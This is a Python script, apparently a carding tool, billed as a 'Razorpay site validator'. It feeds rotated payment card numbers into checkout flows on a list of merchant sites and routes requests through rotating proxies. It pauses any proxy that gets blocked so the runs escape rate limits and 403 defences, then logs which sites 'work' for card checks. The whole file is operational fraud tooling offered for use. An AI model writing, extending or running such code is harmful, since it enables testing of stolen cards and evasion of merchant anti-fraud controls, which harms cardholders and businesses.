#!/usr/bin/env python3
"""Multi-proxy Razorpay site validator — 5 proxies rotated, SERVER_ERROR recheck."""
import os, sys, json, time, argparse, itertools, threading

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from site_check import run_checkout, classify, _site_key

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--sites", required=True)
    ap.add_argument("--proxies", required=True, help="file with proxies, one per line")
    ap.add_argument("--cc", default=None)
    ap.add_argument("--cc-file", default=None, help="rotate a fresh card per site (one per line)")
    ap.add_argument("--out", default="/tmp/rz_sitecheck_multi")
    ap.add_argument("--max-proxies", type=int, default=5)
    ap.add_argument("--per-proxy", type=int, default=15, help="checks before pausing a proxy 60s")
    ap.add_argument("--delay", type=float, default=2.0)
    ap.add_argument("--recheck-delay", type=float, default=120.0)
    a = ap.parse_args()

    with open(a.sites) as f:
        sites = [l.strip() for l in f if l.strip().startswith('http')]
    with open(a.proxies) as f:
        proxies = [l.strip() for l in f if l.strip() and not l.strip().startswith('#')]
    proxies = proxies[:a.max_proxies]
    if not proxies:
        print("no proxies"); sys.exit(1)

    # cards: --cc-file rotates a fresh card per site; --cc is a single fallback
    cards = []
    if a.cc_file:
        with open(a.cc_file) as f:
            cards = [l.strip() for l in f if l.strip() and '|' in l]
        if not cards:
            print("cc-file empty"); sys.exit(1)
    elif a.cc:
        cards = [a.cc]
    else:
        print("need --cc or --cc-file"); sys.exit(1)
    card_ctr = itertools.count()

    def next_card():
        return cards[next(card_ctr) % len(cards)]

    os.makedirs(a.out, exist_ok=True)
    good, skipped, recheck = [], [], []
    proxy_ctr = itertools.count()
    proxy_uses = {}
    proxy_paused_until = {}
    guard = threading.Lock()

    def pick_proxy():
        n = len(proxies)
        for _ in range(n):
            p = proxies[next(proxy_ctr) % n]
            with guard:
                if time.time() >= proxy_paused_until.get(p, 0):
                    return p
        # all paused — wait on the earliest
        with guard:
            p = min(proxies, key=lambda x: proxy_paused_until.get(x, 0))
            wait = proxy_paused_until.get(p, 0) - time.time()
        if wait > 0:
            time.sleep(min(wait, 60))
        return p

    def mark_proxy(p, blocked=False):
        with guard:
            if blocked:
                proxy_paused_until[p] = time.time() + 90
                proxy_uses[p] = 0
            else:
                u = proxy_uses.get(p, 0) + 1
                if u >= a.per_proxy:
                    proxy_paused_until[p] = time.time() + 60
                    proxy_uses[p] = 0
                else:
                    proxy_uses[p] = u

    def process(site_list, tag):
        for site in site_list:
            proxy = pick_proxy()
            log = []
            t0 = time.time()
            cc = next_card()
            try:
                result = run_checkout(site, cc, proxy, log)
            except Exception as e:
                result = {"status": "error", "message": str(e)[:300], "reason": "exception"}
            verdict, why = classify(result)
            blocked = result.get("status") == "error" and ("403" in str(result.get("message","")).lower() or "forbidden" in str(result.get("message","")).lower())
            mark_proxy(proxy, blocked=blocked)
            entry = {"site": site, "verdict": verdict, "why": why, "proxy": proxy, "cc": cc,
                     "result": result, "request_count": len(log),
                     "duration_s": round(time.time()-t0, 2), "responses": log}
            with open(os.path.join(a.out, f"{_site_key(site)}.json"), "w") as f:
                json.dump(entry, f, indent=2)
            print(f"[{tag}] {verdict:8s} {why:35s} via {proxy.split('@')[-1][:22]:22s} {site}", flush=True)
            if verdict == "GOOD":
                good.append(site)
            elif verdict == "RECHECK":
                recheck.append(site)
            else:
                skipped.append(site)
            time.sleep(a.delay)

    print(f"== PASS 1: {len(sites)} sites, {len(proxies)} proxies ==", flush=True)
    process(sites, "pass1")

    if recheck:
        print(f"== SERVER_ERROR {len(recheck)} -> recheck after {a.recheck_delay:.0f}s ==", flush=True)
        time.sleep(a.recheck_delay)
        retry = list(recheck); recheck.clear()
        process(retry, "recheck")

    with open(os.path.join(a.out, "good_sites.txt"), "w") as f:
        f.write("\n".join(good) + ("\n" if good else ""))
    summary = {"total": len(sites), "good": len(good), "skipped": len(skipped),
               "still_server_error": len(recheck), "good_sites": good,
               "skipped_sites": skipped, "server_error_sites": recheck}
    with open(os.path.join(a.out, "summary.json"), "w") as f:
        json.dump(summary, f, indent=2)
    print(f"== DONE == good={len(good)} skipped={len(skipped)} server_error={len(recheck)}", flush=True)
    print(f"logs + good_sites.txt + summary.json -> {a.out}", flush=True)

if __name__ == "__main__":
    main()
